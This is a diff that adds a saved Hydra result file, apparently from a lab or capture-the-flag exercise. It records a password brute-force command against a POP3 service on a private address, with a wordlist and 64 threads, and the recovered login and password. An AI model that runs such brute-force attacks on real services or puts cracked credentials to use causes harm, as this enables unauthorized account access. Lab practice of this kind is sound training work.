@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2024-07-10 18:15:34 on 10.10.214.255 pop3 (hydra -l doak -P /opt/wordlists/fasttrack.txt -I -o hydrascan/result_doak -s 55007 -t 64 pop3://10.10.214.255)
+[55007][pop3] host: 10.10.214.255   login: doak   password: goat
